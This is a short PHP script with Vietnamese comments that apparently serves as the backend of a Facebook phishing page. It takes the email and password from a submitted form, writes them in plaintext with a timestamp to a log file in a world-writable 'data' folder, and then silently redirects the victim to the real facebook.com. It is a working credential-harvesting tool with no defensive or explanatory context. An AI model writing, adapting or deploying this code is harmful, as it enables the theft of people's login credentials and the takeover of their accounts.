<?php
ob_start(); // Bắt đầu buffer để tránh lỗi header

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'] ?? '';
    $password = $_POST['password'] ?? '';

    // Đường dẫn thư mục và file
    $dir_path = "data";
    $file_path = "$dir_path/logins.txt";

    // Kiểm tra và tạo thư mục nếu chưa tồn tại
    if (!is_dir($dir_path)) {
        mkdir($dir_path, 0777, true);
    }

    // Kiểm tra nếu file chưa tồn tại thì tạo mới
    if (!file_exists($file_path)) {
        file_put_contents($file_path, "=== Login Logs ===\n", FILE_APPEND);
    }

    if (!empty($email) && !empty($password)) {
        $log_entry = "Email: $email | Password: $password | Time: " . date("Y-m-d H:i:s") . "\n";

        // Ghi tiếp dữ liệu vào file mà không xóa dữ liệu cũ
        if (file_put_contents($file_path, $log_entry, FILE_APPEND | LOCK_EX)) {
            // Không in gì ra để tránh lỗi header
        } else {
            error_log("Không thể ghi vào file!", 0);
        }
    }

    // Điều hướng mà không có echo nào trước đó
    header("Location: https://www.facebook.com");
    exit();
}

ob_end_flush(); // Kết thúc buffer
?>
